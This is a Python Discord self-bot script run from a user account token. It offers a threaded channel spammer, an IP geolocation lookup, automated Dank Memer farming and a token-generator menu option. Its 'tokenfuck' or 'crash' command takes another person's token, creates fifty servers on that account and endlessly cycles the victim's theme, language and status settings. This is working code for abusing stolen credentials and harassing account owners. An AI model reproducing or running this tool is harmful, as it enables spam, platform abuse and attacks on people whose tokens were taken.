import discord
from discord.ext import commands
import time
import random
import os
from itertools import cycle
import requests
import threading
from colorama import Fore

prefix = ">"
Pepax = commands.Bot(command_prefix=prefix, self_bot=True)
Pepax.remove_command("help")



chnl_id = "YOUR_CHANNEL_ID_(FOR SPAMMER)"
token = "YOUR_TOKEN_HERE"
t1 = token
h1 = {"authorization": token}


dr = DR = r = R = Fore.LIGHTRED_EX
g = G = Fore.LIGHTGREEN_EX
b = B = Fore.LIGHTBLUE_EX
m = M = Fore.LIGHTMAGENTA_EX
c = C = Fore.LIGHTCYAN_EX
y = Y = Fore.LIGHTYELLOW_EX
w = W = Fore.RESET

class prefix():
    prefixlol = prefix


class selfbot():
    version = 1.2


print(f'''
{r} ▄▄▄██▀▀▀▄▄▄       ▄██{b}██▄   ██ ▄█▀▓██   ██▓
{r}   ▒██  ▒████▄    ▒██▀{b} ▀█   ██▄█▒  ▒██  ██▒
{r}   ░██  ▒██  ▀█▄  ▒▓█ {b}   ▄ ▓███▄░   ▒██ ██░
{r}▓██▄██▓ ░██▄▄▄▄██ ▒▓▓▄{b} ▄██▒▓██ █▄   ░ ▐██▓░
{r} ▓███▒   ▓█   ▓██▒▒ ▓█{b}██▀ ░▒██▒ █▄  ░ ██▒▓░
{r} ▒▓▒▒░   ▒▒   ▓▒█░░ ░▒{b} ▒  ░▒ ▒▒ ▓▒   ██▒▒▒ 
{r} ▒ ░▒░    ▒   ▒▒ ░  ░ {b} ▒   ░ ░▒ ▒░ ▓██ ░▒░ 
{r} ░ ░ ░    ░   ▒   ░   {b}     ░ ░░ ░  ▒ ▒ ░░
{r} ░   ░        ░  ░░ ░ {b}     ░  ░    ░ ░
{r}                  ░   {b}             ░ ░
{Fore.RESET}{c}Created By: ╠ϾṨϾ╣PepαxJαcky#3648
{c}Version: {selfbot.version}
{c}Prefix: {prefix.prefixlol}
    ''')

headers = {'Authorization': token, 'Content-Type': 'application/json'}
req = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
if req.status_code == 200:
    pass
else:
    print(f"{r} > Invalid Token")
    exit()

print(f"{g}> Logging In")
time.sleep(5)
print()

options = input(f'''{y}Jacky's Self Bot Options Menu:
{r}1) Normal Self Bot
{r}2) Token Generator
{r}3) Exit
{y}Option: {Fore.RESET}''')

if options == "1":
  pass
elif options == "2":
    os.system("clear")
    import token_gen
    token_gen.Gen()
    print(f"{y}> Task completed")
    print(f'''{r}Exiting...{Fore.RESET}''')
    time.sleep(3)
    exit()
elif options == "3":
    print(f'''{r}Exiting...{Fore.RESET}''')
    time.sleep(3)
    exit()
else:
  print(f"{r}invalid option{Fore.RESET}")
  

def spammer():
    global on
    on = True
    payload = {
        "content": "test"
    }
    while on:
        requests.post(
            f"https://discord.com/api/v9/channels/{chnl_id}/messages",
            headers=h1,
            data=payload)
        time.sleep(9)
        if on == False:
            break


def spamlol():
    threads = []
    for i in range(5):
        t = threading.Thread(target=spammer)
        threads.append(t)
        t.start()


@Pepax.command()
async def spam(ctx):
    await ctx.message.delete()
    spamlol()

@Pepax.command()
async def stop(ctx):
  await ctx.message.delete()
  global on
  on = False

@Pepax.command(aliases=["pfpsearch"])
async def revav(ctx, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    try:
        em = discord.Embed(
            description=
            f"https://images.google.com/searchbyimage?image_url={user.avatar_url}"
        )
        await ctx.send(embed=em)
    except Exception as e:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)


locales = [
    "da", "de", "en-GB", "en-US", "es-ES", "fr", "hr", "it", "lt", "hu", "nl",
    "no", "pl", "pt-BR", "ro", "fi", "sv-SE", "vi", "tr", "cs", "el", "bg",
    "ru", "uk", "th", "zh-CN", "ja", "zh-TW", "ko"
]


@Pepax.command(aliases=['tokenfucker', 'disable', 'crash'])
async def tokenfuck(ctx, _token):
    await ctx.message.delete()
    headers = {
        'User-Agent':
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    guild = {
        'channels': None,
        'icon': None,
        'name': "PepaxJacky",
        'region': "europe"
    }
    for _i in range(50):
        requests.post('https://discordapp.com/api/v9/guilds',
                      headers=headers,
                      json=guild)
    while True:
        try:
            request.patch(
                "https://canary.discordapp.com/api/v9/users/@me/settings",
                headers=headers,
                json=payload)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(locales),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch(
                    "https://canary.discordapp.com/api/v9/users/@me/settings",
                    headers=headers,
                    json=setting,
                    timeout=10)
            except Exception as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
            else:
                break


async def autodank_main(ctx):
  await ctx.message.delete()
  global ADEnabled
  ADEnabled = True
  await time.sleep(3)
  await ctx.send("pls pm")
  time.sleep(3)
  await ctx.send("f")
  print(f"successfully posted meme{Fore.RED}")
  await ctx.send("pls beg")
  print(f"succefully begged{Fore.RED}")
  time.sleep(3)
  await ctx.send("pls fish")
  print(f"succefully fished{Fore.RED}")
  time.sleep(3)
  await ctx.send("pls hunt")
  print(f"succefully hunted{Fore.RED}")
  time.sleep(3)
  await ctx.send("pls dep all")
  print(f"succefully deposited all{Fore.RED}")
  time.sleep(45)


@Pepax.command()
async def stopautodank(ctx):
	await ctx.message.delete()
	await ctx.send('auto dank memer is now **disabled**!')
	global ADEnabled
	ADEnabled = False

@Pepax.command()
async def geoip(ctx, *, ipaddr: str = '1.3.3.7'):
	r = requests.get(f'http://extreme-ip-lookup.com/json/{ipaddr}')
	geo = r.json()
	em = discord.Embed()
	fields = [
	    {
	        'name': 'IP',
	        'value': geo['query']
	    },
	    {
	        'name': 'ipType',
	        'value': geo['ipType']
	    },
	    {
	        'name': 'Country',
	        'value': geo['country']
	    },
	    {
	        'name': 'City',
	        'value': geo['city']
	    },
	    {
	        'name': 'Continent',
	        'value': geo['continent']
	    },
	    {
	        'name': 'Country',
	        'value': geo['country']
	    },
	    {
	        'name': 'IPName',
	        'value': geo['ipName']
	    },
	    {
	        'name': 'ISP',
	        'value': geo['isp']
	    },
	    {
	        'name': 'Latitute',
	        'value': geo['lat']
	    },
	    {
	        'name': 'Longitude',
	        'value': geo['lon']
	    },
	    {
	        'name': 'Org',
	        'value': geo['org']
	    },
	    {
	        'name': 'Region',
	        'value': geo['region']
	    },
	    {
	        'name': 'Status',
	        'value': geo['status']
	    },
	]
	for field in fields:
		if field['value']:
			em.add_field(name=field['name'], value=field['value'], inline=True)
	return await ctx.send(embed=em)

Pepax.run(token, bot=False)
